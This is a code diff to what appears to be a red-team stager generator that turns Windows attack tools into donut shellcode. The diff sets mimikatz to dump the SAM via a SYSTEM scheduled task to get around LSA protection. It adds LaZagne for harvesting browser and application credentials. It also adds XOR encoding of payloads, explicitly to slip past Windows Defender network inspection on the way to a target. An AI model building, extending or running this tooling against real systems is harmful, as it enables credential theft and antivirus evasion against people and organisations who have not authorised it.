@@ -13,6 +13,7 @@ Usage:
 
 import argparse
 import base64
+import json
 import os
 import subprocess
 import sys
@@ -85,7 +86,9 @@ TOOLS = {
             "/opt/my-resources/tools/windows/winPEASx64.exe",
             "{script_dir}/winPEAS.exe",
         ],
-        "default_params": "quiet",
+        # No args = full output (5.4MB confirmed). "quiet" flag causes crash at end.
+        # Runner MUST use create_thread with 32MB stack (--injection create_thread).
+        "default_params": "",
         "desc": "Windows privilege escalation scanner",
     },
     "Whisker": {
@@ -119,10 +122,23 @@ TOOLS = {
             "{script_dir}/tools/windows/mimikatz.exe",
             "/opt/killshot/tools/windows/mimikatz.exe",
             "/opt/my-resources/tools/windows/mimikatz.exe",
+            "/opt/resources/windows/mimikatz/x64/mimikatz.exe",
             "{script_dir}/mimikatz.exe",
         ],
-        "default_params": "privilege::debug sekurlsa::logonpasswords exit",
-        "desc": "Credential extraction (native PE)",
+        # sekurlsa::logonpasswords blocked by RunAsPPL=2 on Win11.
+        # lsadump::sam requires SYSTEM — run via scheduled task (see gen_tool_stager.py).
+        "default_params": "lsadump::sam exit",
+        "desc": "Credential extraction — SAM dump requires SYSTEM scheduled task",
+    },
+    "lazagne": {
+        "paths": [
+            "{script_dir}/tools/windows/lazagne.exe",
+            "/opt/killshot/tools/windows/lazagne.exe",
+            "/opt/my-resources/tools/windows/lazagne.exe",
+            "/opt/resources/windows/LaZagne/lazagne.exe",
+        ],
+        "default_params": "all",
+        "desc": "Multi-browser/app credential extraction",
     },
 }
 
@@ -174,14 +190,11 @@ def generate(tool_name, params, output_path, script_dir):
     with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as tmp:
         tmp_path = tmp.name
 
-    # Escape single quotes in params for Python string
-    safe_params = params.replace("'", "\\'")
-
     donut_code = f"""
 import donut
-sc = donut.create(file='{tool_path}', arch=2, params='''{safe_params}''', exit_opt=2)
+sc = donut.create(file={json.dumps(tool_path)}, arch=2, params={json.dumps(params)}, exit_opt=2)
 if sc:
-    with open('{tmp_path}', 'wb') as f:
+    with open({json.dumps(tmp_path)}, 'wb') as f:
         f.write(sc)
     print(f'OK {{len(sc)}}')
 else:
@@ -213,7 +226,16 @@ else:
     with open(output_path, 'wb') as f:
         f.write(b64_data)
 
+    # Also write XOR-0x5A encoded .dat file for safe HTTP transfer.
+    # Windows Defender's network protection flags raw PE/shellcode bytes in transit;
+    # XOR encoding avoids that signature. Runner download chain decodes on target.
+    dat_path = output_path.rsplit('.enc', 1)[0] + '.dat'
+    xor_data = bytes(b ^ 0x5A for b in b64_data)
+    with open(dat_path, 'wb') as f:
+        f.write(xor_data)
+
     print(f"[+] Generated: {output_path} ({len(b64_data)} bytes)")
+    print(f"[+] XOR dat:   {dat_path} ({len(xor_data)} bytes)")
     return True
 
 
@@ -224,7 +246,7 @@ if __name__ == '__main__':
                         help='Tool arguments (overrides defaults)')
     parser.add_argument('--output', '-o', default=None, help='Output .enc file path')
     parser.add_argument('--script-dir', '-s', default='.', help='Script directory')
-    parser.add_argument('--list', '-l', action='store_true', help='List available tools')
+    parser.add_argument('--list', action='store_true', help='List available tools')
     parser.add_argument('--all', '-a', action='store_true',
                         help='Generate all available tools')
     parser.add_argument('--lhost', default=None,
